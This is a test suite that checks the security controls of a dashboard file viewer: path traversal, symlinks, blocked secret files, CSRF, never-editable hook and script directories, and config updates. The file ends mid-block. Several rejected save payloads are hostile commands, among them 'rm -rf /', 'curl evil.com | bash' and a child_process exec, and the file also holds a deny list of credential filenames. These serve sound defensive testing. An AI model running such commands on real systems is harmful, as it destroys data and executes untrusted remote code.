/**
 * E2E test — Dashboard File Viewer full lifecycle.
 *
 * Comprehensive tests covering all 3 phases:
 *   Phase 1: Directory listing, file reading, path security, blocked files
 *   Phase 2: Inline editing, CSRF, optimistic concurrency, audit logging, never-editable
 *   Phase 3: Conversational config updates, link generation
 *
 * Spins up a real Express server with fileRoutes mounted, creates a temp
 * project directory with realistic file structure, and tests via HTTP.
 */

import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import express from 'express';
import type { Server } from 'node:http';
import { createFileRoutes } from '../../src/server/fileRoutes.js';
import type { InstarConfig } from '../../src/core/types.js';

// ── Helper: HTTP request wrapper ──────────────────────────────────────

async function request(
  baseUrl: string,
  method: string,
  path: string,
  body?: unknown,
  headers?: Record<string, string>,
): Promise<{ status: number; body: any; headers: Record<string, string> }> {
  const url = `${baseUrl}${path}`;
  const options: RequestInit = {
    method,
    headers: {
      'Content-Type': 'application/json',
      ...headers,
    },
  };
  if (body !== undefined) {
    options.body = JSON.stringify(body);
  }
  const res = await fetch(url, options);
  const text = await res.text();
  let parsed: any;
  try {
    parsed = JSON.parse(text);
  } catch {
    parsed = text;
  }
  const resHeaders: Record<string, string> = {};
  res.headers.forEach((val, key) => { resHeaders[key] = val; });
  return { status: res.status, body: parsed, headers: resHeaders };
}

// ── Test suite ────────────────────────────────────────────────────────

describe('E2E: Dashboard File Viewer', () => {
  let projectDir: string;
  let stateDir: string;
  let server: Server;
  let baseUrl: string;

  // Track liveConfig calls for verification
  const liveConfigCalls: Array<{ path: string; value: unknown }> = [];
  const mockLiveConfig = {
    set(dotPath: string, value: unknown) {
      liveConfigCalls.push({ path: dotPath, value });
    },
  };

  beforeAll(async () => {
    // Create temp project with realistic structure
    projectDir = fs.mkdtempSync(path.join(os.tmpdir(), 'instar-fileviewer-e2e-'));
    stateDir = path.join(projectDir, '.instar');

    // .claude/ directory (allowed by default)
    fs.mkdirSync(path.join(projectDir, '.claude', 'hooks'), { recursive: true });
    fs.mkdirSync(path.join(projectDir, '.claude', 'scripts'), { recursive: true });
    fs.mkdirSync(path.join(projectDir, '.claude', 'skills', 'reflect'), { recursive: true });
    fs.mkdirSync(path.join(projectDir, '.claude', 'config'), { recursive: true });
    fs.writeFileSync(path.join(projectDir, '.claude', 'CLAUDE.md'), '# CLAUDE.md\n\nProject instructions here.\n');
    fs.writeFileSync(path.join(projectDir, '.claude', 'hooks', 'session-start.sh'), '#!/bin/bash\necho "hello"');
    fs.writeFileSync(path.join(projectDir, '.claude', 'scripts', 'deploy.sh'), '#!/bin/bash\necho "deploying"');
    fs.writeFileSync(path.join(projectDir, '.claude', 'skills', 'reflect', 'SKILL.md'), '# /reflect\n\nReflect on session.');
    fs.writeFileSync(path.join(projectDir, '.claude', 'config', 'settings.json'), '{"theme": "dark"}');

    // docs/ directory (allowed by default)
    fs.mkdirSync(path.join(projectDir, 'docs', 'api'), { recursive: true });
    fs.writeFileSync(path.join(projectDir, 'docs', 'README.md'), '# Documentation\n\nWelcome to the docs.\n');
    fs.writeFileSync(path.join(projectDir, 'docs', 'api', 'endpoints.md'), '# API Endpoints\n\n## GET /health\n');

    // src/ directory (not allowed by default)
    fs.mkdirSync(path.join(projectDir, 'src'), { recursive: true });
    fs.writeFileSync(path.join(projectDir, 'src', 'index.ts'), 'console.log("hello world");');

    // Sensitive files that should be blocked
    fs.writeFileSync(path.join(projectDir, '.claude', '.env'), 'SECRET_KEY=abc123');
    fs.writeFileSync(path.join(projectDir, '.claude', '.env.local'), 'DB_URL=postgres://...');
    fs.writeFileSync(path.join(projectDir, '.claude', 'token.json'), '{"access_token":"xyz"}');

    // Binary file
    fs.writeFileSync(path.join(projectDir, '.claude', 'icon.png'), Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x00]));

    // .instar/ state directory
    fs.mkdirSync(stateDir, { recursive: true });

    // Large file for size limit testing
    const largeContent = 'x'.repeat(1_200_000); // 1.2MB, over default 1MB limit
    fs.writeFileSync(path.join(projectDir, 'docs', 'large-file.txt'), largeContent);

    // Empty file
    fs.writeFileSync(path.join(projectDir, 'docs', 'empty.md'), '');

    // node_modules (never-editable)
    fs.mkdirSync(path.join(projectDir, 'node_modules', 'some-pkg'), { recursive: true });
    fs.writeFileSync(path.join(projectDir, 'node_modules', 'some-pkg', 'index.js'), 'module.exports = {}');

    // Create a symlink inside .claude/ that points outside project (for security test)
    try {
      fs.symlinkSync('/etc/hosts', path.join(projectDir, '.claude', 'evil-link'));
    } catch {
      // Symlink creation may fail on some systems — test will be skipped
    }

    const config: InstarConfig = {
      projectDir,
      stateDir,
      projectName: 'fileviewer-e2e',
      agentName: 'test-agent',
      port: 0,
      dashboard: {
        fileViewer: {
          enabled: true,
          allowedPaths: ['.claude/', 'docs/'],
          editablePaths: ['.claude/config/', '.claude/skills/'],
          maxFileSize: 1_048_576,
          maxEditableFileSize: 204_800,
          blockedFilenames: [
            '.env', '.env.*', '*.key', '*.pem', '*.p12', 'secrets.*',
            'credentials.*', '*.secret', 'id_rsa', 'id_ed25519', '*.pfx',
            '*.jks', 'token.json',
          ],
        },
      },
    } as InstarConfig;

    const app = express();
    app.use(express.json({ limit: '1mb' }));

    const fileRoutes = createFileRoutes({ config, liveConfig: mockLiveConfig });
    app.use(fileRoutes);

    await new Promise<void>((resolve) => {
      server = app.listen(0, '127.0.0.1', () => {
        const addr = server.address() as { port: number };
        baseUrl = `http://127.0.0.1:${addr.port}`;
        resolve();
      });
    });
  });

  afterAll(async () => {
    if (server) {
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
    // safe-git-allow: incremental-migration
    fs.rmSync(projectDir, { recursive: true, force: true });
  });

  // ════════════════════════════════════════════════════════════════════
  // Phase 1: Directory Listing & File Reading
  // ════════════════════════════════════════════════════════════════════

  describe('Phase 1: Directory listing', () => {
    it('lists root allowed directories when no path specified', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/list');
      expect(res.status).toBe(200);
      expect(res.body.entries).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ name: '.claude', type: 'directory' }),
          expect.objectContaining({ name: 'docs', type: 'directory' }),
        ]),
      );
      // src/ should NOT be listed (not in allowedPaths)
      const srcEntry = res.body.entries.find((e: any) => e.name === 'src');
      expect(srcEntry).toBeUndefined();
    });

    it('lists directory contents within allowed path', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/list?path=.claude/');
      expect(res.status).toBe(200);
      expect(res.body.entries).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ name: 'CLAUDE.md', type: 'file' }),
          expect.objectContaining({ name: 'hooks', type: 'directory' }),
          expect.objectContaining({ name: 'scripts', type: 'directory' }),
          expect.objectContaining({ name: 'skills', type: 'directory' }),
          expect.objectContaining({ name: 'config', type: 'directory' }),
        ]),
      );
    });

    it('lists nested directory contents', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/list?path=docs/api/');
      expect(res.status).toBe(200);
      expect(res.body.entries).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ name: 'endpoints.md', type: 'file' }),
        ]),
      );
    });

    it('rejects listing outside allowed paths', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/list?path=src/');
      expect(res.status).toBe(403);
      expect(res.body.error).toContain('not in allowed');
    });

    it('rejects path traversal in directory listing', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/list?path=.claude/../../');
      expect(res.status).toBe(403);
      expect(res.body.error).toContain('traversal');
    });

    it('rejects absolute paths', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/list?path=/etc/');
      expect(res.status).toBe(403);
      expect(res.body.error).toContain('Absolute');
    });

    it('returns 404 for non-existent directory', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/list?path=.claude/nonexistent/');
      expect(res.status).toBe(404);
    });

    it('sets Cache-Control: no-store header', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/list');
      expect(res.headers['cache-control']).toBe('no-store');
    });

    it('filters out blocked filenames from directory listings', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/list?path=.claude/');
      expect(res.status).toBe(200);
      const names = res.body.entries.map((e: any) => e.name);
      expect(names).not.toContain('.env');
      expect(names).not.toContain('.env.local');
      expect(names).not.toContain('token.json');
    });
  });

  describe('Phase 1: File reading', () => {
    it('reads a markdown file with metadata', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/read?path=.claude/CLAUDE.md');
      expect(res.status).toBe(200);
      expect(res.body.content).toContain('# CLAUDE.md');
      expect(res.body.content).toContain('Project instructions here.');
      expect(res.body.size).toBeGreaterThan(0);
      expect(res.body.modified).toBeDefined();
      expect(res.body.path).toBe('.claude/CLAUDE.md');
    });

    it('includes editable flag based on editablePaths config', async () => {
      // .claude/config/ is in editablePaths
      const res1 = await request(baseUrl, 'GET', '/api/files/read?path=.claude/config/settings.json');
      expect(res1.status).toBe(200);
      expect(res1.body.editable).toBe(true);

      // .claude/CLAUDE.md is NOT in editablePaths
      const res2 = await request(baseUrl, 'GET', '/api/files/read?path=.claude/CLAUDE.md');
      expect(res2.status).toBe(200);
      expect(res2.body.editable).toBe(false);
    });

    it('reads nested file', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/read?path=docs/api/endpoints.md');
      expect(res.status).toBe(200);
      expect(res.body.content).toContain('# API Endpoints');
    });

    it('reads empty file', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/read?path=docs/empty.md');
      expect(res.status).toBe(200);
      expect(res.body.content).toBe('');
      expect(res.body.size).toBe(0);
    });

    it('rejects reading files outside allowed paths', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/read?path=src/index.ts');
      expect(res.status).toBe(403);
    });

    it('rejects reading blocked files', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/read?path=.claude/.env');
      expect(res.status).toBe(403);
      expect(res.body.error).toContain('blocked');
    });

    it('rejects reading .env.local (glob pattern)', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/read?path=.claude/.env.local');
      expect(res.status).toBe(403);
    });

    it('rejects reading token.json (exact match blocked)', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/read?path=.claude/token.json');
      expect(res.status).toBe(403);
    });

    it('detects binary files', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/read?path=.claude/icon.png');
      expect(res.status).toBe(200);
      expect(res.body.binary).toBe(true);
      expect(res.body.content).toBeUndefined();
    });

    it('rejects files exceeding maxFileSize', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/read?path=docs/large-file.txt');
      expect(res.status).toBe(413);
      expect(res.body.error).toContain('large');
    });

    it('rejects path traversal in file reading', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/read?path=.claude/../../etc/passwd');
      expect(res.status).toBe(403);
    });

    it('returns 404 for non-existent file', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/read?path=.claude/nonexistent.md');
      expect(res.status).toBe(404);
    });
  });

  describe('Phase 1: Symlink security', () => {
    it('rejects symlinks that escape project root', async () => {
      const symlinkPath = path.join(projectDir, '.claude', 'evil-link');
      if (!fs.existsSync(symlinkPath)) {
        // Symlink wasn't created in setup (e.g., Windows) — skip
        return;
      }
      const res = await request(baseUrl, 'GET', '/api/files/read?path=.claude/evil-link');
      expect(res.status).toBe(403);
      expect(res.body.error).toContain('outside project root');
    });
  });

  // ════════════════════════════════════════════════════════════════════
  // Phase 2: Inline Editing
  // ════════════════════════════════════════════════════════════════════

  describe('Phase 2: File saving', () => {
    it('saves a file in an editable path', async () => {
      // First read to get the modified timestamp
      const readRes = await request(baseUrl, 'GET', '/api/files/read?path=.claude/config/settings.json');
      expect(readRes.status).toBe(200);
      const { modified } = readRes.body;

      // Save with updated content
      const newContent = '{"theme": "light", "fontSize": 14}';
      const saveRes = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/config/settings.json',
        content: newContent,
        expectedModified: modified,
      }, { 'x-instar-request': '1' });

      expect(saveRes.status).toBe(200);
      expect(saveRes.body.success).toBe(true);
      expect(saveRes.body.modified).toBeDefined();
      expect(saveRes.body.modified).not.toBe(modified); // Timestamp should change

      // Verify the file was actually written
      const verifyRes = await request(baseUrl, 'GET', '/api/files/read?path=.claude/config/settings.json');
      expect(verifyRes.body.content).toBe(newContent);
    });

    it('saves a skill file in an editable path', async () => {
      const readRes = await request(baseUrl, 'GET', '/api/files/read?path=.claude/skills/reflect/SKILL.md');
      expect(readRes.status).toBe(200);

      const newContent = '# /reflect\n\nUpdated reflection skill.\n\n## Steps\n1. Review session\n2. Capture learnings';
      const saveRes = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/skills/reflect/SKILL.md',
        content: newContent,
        expectedModified: readRes.body.modified,
      }, { 'x-instar-request': '1' });

      expect(saveRes.status).toBe(200);
      expect(saveRes.body.success).toBe(true);
    });
  });

  describe('Phase 2: CSRF protection', () => {
    it('rejects save without X-Instar-Request header', async () => {
      const res = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/config/settings.json',
        content: 'hacked',
      });
      expect(res.status).toBe(403);
      expect(res.body.error).toContain('CSRF');
    });

    it('rejects save with wrong CSRF header value', async () => {
      const res = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/config/settings.json',
        content: 'hacked',
      }, { 'x-instar-request': '0' });
      expect(res.status).toBe(403);
    });
  });

  describe('Phase 2: Optimistic concurrency', () => {
    it('returns 409 on stale expectedModified timestamp', async () => {
      // Read current state
      const readRes = await request(baseUrl, 'GET', '/api/files/read?path=.claude/config/settings.json');
      expect(readRes.status).toBe(200);

      // Save once to change the mtime
      const save1 = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/config/settings.json',
        content: '{"version": 1}',
        expectedModified: readRes.body.modified,
      }, { 'x-instar-request': '1' });
      expect(save1.status).toBe(200);

      // Try to save again with the OLD timestamp — should conflict
      const save2 = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/config/settings.json',
        content: '{"version": 2}',
        expectedModified: readRes.body.modified, // Stale!
      }, { 'x-instar-request': '1' });
      expect(save2.status).toBe(409);
      expect(save2.body.error).toContain('modified');
      expect(save2.body.currentModified).toBeDefined();
      expect(save2.body.expectedModified).toBe(readRes.body.modified);
    });

    it('succeeds when expectedModified matches current mtime', async () => {
      // Read fresh state
      const readRes = await request(baseUrl, 'GET', '/api/files/read?path=.claude/config/settings.json');
      const saveRes = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/config/settings.json',
        content: '{"version": 3}',
        expectedModified: readRes.body.modified,
      }, { 'x-instar-request': '1' });
      expect(saveRes.status).toBe(200);
      expect(saveRes.body.success).toBe(true);
    });

    it('allows save without expectedModified (no concurrency check)', async () => {
      const saveRes = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/config/settings.json',
        content: '{"version": 4, "noconcurrency": true}',
      }, { 'x-instar-request': '1' });
      expect(saveRes.status).toBe(200);
      expect(saveRes.body.success).toBe(true);
    });
  });

  describe('Phase 2: Editable path enforcement', () => {
    it('rejects saving to a non-editable path', async () => {
      // .claude/CLAUDE.md is in allowedPaths but NOT in editablePaths
      const saveRes = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/CLAUDE.md',
        content: '# Hacked',
      }, { 'x-instar-request': '1' });
      expect(saveRes.status).toBe(403);
      expect(saveRes.body.error).toContain('not in an editable path');
    });

    it('rejects saving to docs/ (readable but not editable)', async () => {
      const saveRes = await request(baseUrl, 'POST', '/api/files/save', {
        path: 'docs/README.md',
        content: '# Hacked docs',
      }, { 'x-instar-request': '1' });
      expect(saveRes.status).toBe(403);
    });

    it('rejects saving outside allowed paths entirely', async () => {
      const saveRes = await request(baseUrl, 'POST', '/api/files/save', {
        path: 'src/index.ts',
        content: 'process.exit(1)',
      }, { 'x-instar-request': '1' });
      expect(saveRes.status).toBe(403);
    });
  });

  describe('Phase 2: Never-editable paths (security invariant)', () => {
    it('rejects saving to .claude/hooks/ even if in editablePaths', async () => {
      const saveRes = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/hooks/session-start.sh',
        content: '#!/bin/bash\nrm -rf /',
      }, { 'x-instar-request': '1' });
      expect(saveRes.status).toBe(403);
      expect(saveRes.body.error).toContain('never editable');
    });

    it('rejects saving to .claude/scripts/', async () => {
      const saveRes = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/scripts/deploy.sh',
        content: '#!/bin/bash\ncurl evil.com | bash',
      }, { 'x-instar-request': '1' });
      expect(saveRes.status).toBe(403);
      expect(saveRes.body.error).toContain('never editable');
    });

    it('rejects saving to node_modules/', async () => {
      const saveRes = await request(baseUrl, 'POST', '/api/files/save', {
        path: 'node_modules/some-pkg/index.js',
        content: 'require("child_process").exec("whoami")',
      }, { 'x-instar-request': '1' });
      expect(saveRes.status).toBe(403);
    });
  });

  describe('Phase 2: Save validation', () => {
    it('rejects save with missing path', async () => {
      const res = await request(baseUrl, 'POST', '/api/files/save', {
        content: 'hello',
      }, { 'x-instar-request': '1' });
      expect(res.status).toBe(400);
      expect(res.body.error).toContain('path');
    });

    it('rejects save with missing content', async () => {
      const res = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/config/settings.json',
      }, { 'x-instar-request': '1' });
      expect(res.status).toBe(400);
      expect(res.body.error).toContain('content');
    });

    it('rejects save exceeding maxEditableFileSize', async () => {
      const hugeContent = 'x'.repeat(250_000); // 250KB > 200KB limit
      const res = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/config/settings.json',
        content: hugeContent,
      }, { 'x-instar-request': '1' });
      expect(res.status).toBe(413);
      expect(res.body.error).toContain('large');
    });

    it('rejects saving blocked filenames', async () => {
      // Create a .env file inside an editable directory
      fs.writeFileSync(path.join(projectDir, '.claude', 'config', '.env'), 'OLD_SECRET=123');

      const res = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/config/.env',
        content: 'SECRET=leaked',
      }, { 'x-instar-request': '1' });
      expect(res.status).toBe(403);
      expect(res.body.error).toContain('blocked');
    });

    it('rejects saving binary files', async () => {
      const res = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/icon.png',
        content: 'not real png data',
      }, { 'x-instar-request': '1' });
      // Either blocked by not-editable or binary check
      expect(res.status).toBeGreaterThanOrEqual(400);
    });

    it('rejects path traversal in save', async () => {
      const res = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/../../etc/passwd',
        content: 'root:x:0:0:',
      }, { 'x-instar-request': '1' });
      expect(res.status).toBe(403);
    });
  });

  describe('Phase 2: Audit logging', () => {
    it('creates audit log entries for successful saves', async () => {
      // Read to get fresh timestamp
      const readRes = await request(baseUrl, 'GET', '/api/files/read?path=.claude/config/settings.json');

      // Save
      await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/config/settings.json',
        content: '{"audit": "test"}',
        expectedModified: readRes.body.modified,
      }, { 'x-instar-request': '1' });

      // Check audit log exists and has entries
      const auditPath = path.join(projectDir, '.instar', 'file-viewer-audit.jsonl');
      expect(fs.existsSync(auditPath)).toBe(true);

      const lines = fs.readFileSync(auditPath, 'utf-8').trim().split('\n');
      expect(lines.length).toBeGreaterThan(0);

      const lastEntry = JSON.parse(lines[lines.length - 1]);
      expect(lastEntry.operation).toBe('write');
      expect(lastEntry.path).toBe('.claude/config/settings.json');
      expect(lastEntry.success).toBe(true);
      expect(lastEntry.timestamp).toBeDefined();
    });

    it('logs conflict events in audit log', async () => {
      // Read current state
      const readRes = await request(baseUrl, 'GET', '/api/files/read?path=.claude/config/settings.json');

      // Save to change mtime
      await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/config/settings.json',
        content: '{"conflict": "setup"}',
        expectedModified: readRes.body.modified,
      }, { 'x-instar-request': '1' });

      // Try stale save to trigger conflict
      await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/config/settings.json',
        content: '{"conflict": "attempt"}',
        expectedModified: readRes.body.modified, // Stale
      }, { 'x-instar-request': '1' });

      // Check audit log for conflict entry
      const auditPath = path.join(projectDir, '.instar', 'file-viewer-audit.jsonl');
      const lines = fs.readFileSync(auditPath, 'utf-8').trim().split('\n');
      const conflictEntries = lines
        .map(l => JSON.parse(l))
        .filter((e: any) => e.operation === 'write_conflict');
      expect(conflictEntries.length).toBeGreaterThan(0);
      expect(conflictEntries[0].success).toBe(false);
    });
  });

  // ════════════════════════════════════════════════════════════════════
  // Phase 3: Conversational Config Updates
  // ════════════════════════════════════════════════════════════════════

  describe('Phase 3: Config API', () => {
    it('returns current config via GET', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/config');
      expect(res.status).toBe(200);
      expect(res.body.enabled).toBe(true);
      expect(res.body.allowedPaths).toContain('.claude/');
      expect(res.body.allowedPaths).toContain('docs/');
      expect(res.body.editablePaths).toContain('.claude/config/');
      expect(res.body.maxFileSize).toBe(1_048_576);
    });

    it('updates allowedPaths via PATCH', async () => {
      liveConfigCalls.length = 0; // Reset tracking

      const res = await request(baseUrl, 'PATCH', '/api/files/config', {
        allowedPaths: ['.claude/', 'docs/', 'src/'],
      }, { 'x-instar-request': '1' });

      expect(res.status).toBe(200);
      expect(res.body.updated).toBe(true);
      expect(res.body.allowedPaths).toContain('src/');

      // Verify LiveConfig.set was called
      expect(liveConfigCalls).toContainEqual({
        path: 'dashboard.fileViewer.allowedPaths',
        value: ['.claude/', 'docs/', 'src/'],
      });

      // Now src/ should be listable
      const listRes = await request(baseUrl, 'GET', '/api/files/list?path=src/');
      expect(listRes.status).toBe(200);
      expect(listRes.body.entries).toEqual(
        expect.arrayContaining([
          expect.objectContaining({ name: 'index.ts' }),
        ]),
      );
    });

    it('updates editablePaths via PATCH', async () => {
      liveConfigCalls.length = 0;

      const res = await request(baseUrl, 'PATCH', '/api/files/config', {
        editablePaths: ['.claude/config/', '.claude/skills/', 'docs/'],
      }, { 'x-instar-request': '1' });

      expect(res.status).toBe(200);
      expect(res.body.editablePaths).toContain('docs/');

      // Verify docs/ files are now editable
      const readRes = await request(baseUrl, 'GET', '/api/files/read?path=docs/README.md');
      expect(readRes.body.editable).toBe(true);

      // Verify LiveConfig.set was called
      expect(liveConfigCalls).toContainEqual({
        path: 'dashboard.fileViewer.editablePaths',
        value: ['.claude/config/', '.claude/skills/', 'docs/'],
      });
    });

    it('rejects PATCH without CSRF header', async () => {
      const res = await request(baseUrl, 'PATCH', '/api/files/config', {
        allowedPaths: ['.claude/'],
      });
      expect(res.status).toBe(403);
      expect(res.body.error).toContain('CSRF');
    });

    it('rejects allowedPaths with path traversal', async () => {
      const res = await request(baseUrl, 'PATCH', '/api/files/config', {
        allowedPaths: ['../../../etc/'],
      }, { 'x-instar-request': '1' });
      expect(res.status).toBe(400);
      expect(res.body.error).toContain('..');
    });

    it('rejects allowedPaths with absolute paths', async () => {
      const res = await request(baseUrl, 'PATCH', '/api/files/config', {
        allowedPaths: ['/etc/'],
      }, { 'x-instar-request': '1' });
      expect(res.status).toBe(400);
    });

    it('rejects editablePaths targeting never-editable directories', async () => {
      const res = await request(baseUrl, 'PATCH', '/api/files/config', {
        editablePaths: ['.claude/hooks/'],
      }, { 'x-instar-request': '1' });
      expect(res.status).toBe(400);
      expect(res.body.error).toContain('never editable');
    });

    it('rejects editablePaths targeting .claude/scripts/', async () => {
      const res = await request(baseUrl, 'PATCH', '/api/files/config', {
        editablePaths: ['.claude/scripts/'],
      }, { 'x-instar-request': '1' });
      expect(res.status).toBe(400);
      expect(res.body.error).toContain('never editable');
    });

    it('rejects editablePaths targeting node_modules/', async () => {
      const res = await request(baseUrl, 'PATCH', '/api/files/config', {
        editablePaths: ['node_modules/'],
      }, { 'x-instar-request': '1' });
      expect(res.status).toBe(400);
      expect(res.body.error).toContain('never editable');
    });

    it('rejects non-array allowedPaths', async () => {
      const res = await request(baseUrl, 'PATCH', '/api/files/config', {
        allowedPaths: 'not-an-array',
      }, { 'x-instar-request': '1' });
      expect(res.status).toBe(400);
    });

    it('rejects non-string items in allowedPaths', async () => {
      const res = await request(baseUrl, 'PATCH', '/api/files/config', {
        allowedPaths: ['.claude/', 123],
      }, { 'x-instar-request': '1' });
      expect(res.status).toBe(400);
    });

    it('allows partial update (only allowedPaths, keep editablePaths)', async () => {
      // Set known state first
      await request(baseUrl, 'PATCH', '/api/files/config', {
        editablePaths: ['.claude/config/'],
      }, { 'x-instar-request': '1' });

      // Update only allowedPaths
      const res = await request(baseUrl, 'PATCH', '/api/files/config', {
        allowedPaths: ['.claude/', 'docs/'],
      }, { 'x-instar-request': '1' });

      expect(res.status).toBe(200);
      expect(res.body.allowedPaths).toEqual(['.claude/', 'docs/']);
      // editablePaths should still be what we set above
      expect(res.body.editablePaths).toEqual(['.claude/config/']);
    });
  });

  describe('Phase 3: Link generation', () => {
    it('generates a deep link for a file', async () => {
      // Ensure .claude/ is in allowedPaths
      await request(baseUrl, 'PATCH', '/api/files/config', {
        allowedPaths: ['.claude/', 'docs/'],
      }, { 'x-instar-request': '1' });

      const res = await request(baseUrl, 'GET', '/api/files/link?path=.claude/CLAUDE.md');
      expect(res.status).toBe(200);
      expect(res.body.path).toBe('.claude/CLAUDE.md');
      expect(res.body.relative).toContain('/dashboard?tab=files&path=');
      expect(res.body.relative).toContain(encodeURIComponent('.claude/CLAUDE.md'));
      expect(typeof res.body.editable).toBe('boolean');
    });

    it('includes editable status in link response', async () => {
      // .claude/config/ is in editablePaths
      const res1 = await request(baseUrl, 'GET', '/api/files/link?path=.claude/config/settings.json');
      expect(res1.status).toBe(200);
      expect(res1.body.editable).toBe(true);

      // .claude/CLAUDE.md is NOT in editablePaths
      const res2 = await request(baseUrl, 'GET', '/api/files/link?path=.claude/CLAUDE.md');
      expect(res2.status).toBe(200);
      expect(res2.body.editable).toBe(false);
    });

    it('rejects link for file outside allowed paths', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/link?path=src/index.ts');
      expect(res.status).toBe(403);
      expect(res.body.error).toContain('not in allowed');
    });

    it('rejects link with missing path', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/link');
      expect(res.status).toBe(400);
      expect(res.body.error).toContain('path');
    });

    it('generates correct URL encoding for paths with special chars', async () => {
      const res = await request(baseUrl, 'GET', '/api/files/link?path=docs/README.md');
      expect(res.status).toBe(200);
      // URL should be properly encoded
      expect(res.body.relative).toBe('/dashboard?tab=files&path=docs%2FREADME.md');
    });
  });

  // ════════════════════════════════════════════════════════════════════
  // Cross-phase integration tests
  // ════════════════════════════════════════════════════════════════════

  describe('Integration: Full read-edit-verify cycle', () => {
    it('reads, edits, and verifies a file end-to-end', async () => {
      // Ensure config is set up
      await request(baseUrl, 'PATCH', '/api/files/config', {
        allowedPaths: ['.claude/', 'docs/'],
        editablePaths: ['.claude/config/', '.claude/skills/'],
      }, { 'x-instar-request': '1' });

      // 1. Read the original file
      const read1 = await request(baseUrl, 'GET', '/api/files/read?path=.claude/config/settings.json');
      expect(read1.status).toBe(200);
      expect(read1.body.editable).toBe(true);
      const originalModified = read1.body.modified;

      // 2. Generate a link for it
      const link = await request(baseUrl, 'GET', '/api/files/link?path=.claude/config/settings.json');
      expect(link.status).toBe(200);
      expect(link.body.editable).toBe(true);

      // 3. Save new content
      const updatedContent = '{"theme": "solarized", "editor": "vim"}';
      const save = await request(baseUrl, 'POST', '/api/files/save', {
        path: '.claude/config/settings.json',
        content: updatedContent,
        expectedModified: originalModified,
      }, { 'x-instar-request': '1' });
      expect(save.status).toBe(200);
      expect(save.body.success).toBe(true);

      // 4. Re-read and verify
      const read2 = await request(baseUrl, 'GET', '/api/files/read?path=.claude/config/settings.json');
      expect(read2.status).toBe(200);
      expect(read2.body.content).toBe(updatedContent);
      expect(read2.body.modified).not.toBe(originalModified);

      // 5. Verify the file on disk
      const diskContent = fs.readFileSync(
        path.join(projectDir, '.claude', 'config', 'settings.json'),
        'utf-8',
      );
      expect(diskContent).toBe(updatedContent);
    });
  });

  describe('Integration: Config update enables new paths', () => {
    it('adding a path via PATCH makes it immediately browsable and readable', async () => {
      // src/ starts as not-allowed
      const before = await request(baseUrl, 'GET', '/api/files/list?path=src/');
      // May or may not be 403 depending on previous test state — reset
      await request(baseUrl, 'PATCH', '/api/files/config', {
        allowedPaths: ['.claude/', 'docs/'],
      }, { 'x-instar-request': '1' });

      const blocked = await request(baseUrl, 'GET', '/api/files/read?path=src/index.ts');
      expect(blocked.status).toBe(403);

      // Add src/ to allowed
      await request(baseUrl, 'PATCH', '/api/files/config', {
        allowedPaths: ['.claude/', 'docs/', 'src/'],
      }, { 'x-instar-request': '1' });

      // Now it should be readable
      const unblocked = await request(baseUrl, 'GET', '/api/files/read?path=src/index.ts');
      expect(unblocked.status).toBe(200);
      expect(unblocked.body.content).toContain('hello world');
      expect(unblocked.body.editable).toBe(false); // Not in editablePaths
    });

    it('adding editable path via PATCH enables saving', async () => {
      // Make src/ both allowed and editable
      await request(baseUrl, 'PATCH', '/api/files/config', {
        allowedPaths: ['.claude/', 'docs/', 'src/'],
        editablePaths: ['.claude/config/', 'src/'],
      }, { 'x-instar-request': '1' });

      // Read the file
      const read = await request(baseUrl, 'GET', '/api/files/read?path=src/index.ts');
      expect(read.status).toBe(200);
      expect(read.body.editable).toBe(true);

      // Save it
      const save = await request(baseUrl, 'POST', '/api/files/save', {
        path: 'src/index.ts',
        content: 'console.log("edited via dashboard");',
        expectedModified: read.body.modified,
      }, { 'x-instar-request': '1' });
      expect(save.status).toBe(200);
      expect(save.body.success).toBe(true);

      // Restore state
      await request(baseUrl, 'PATCH', '/api/files/config', {
        allowedPaths: ['.claude/', 'docs/'],
        editablePaths: ['.claude/config/', '.claude/skills/'],
      }, { 'x-instar-request': '1' });
    });
  });

  describe('Integration: Security invariants hold across config updates', () => {
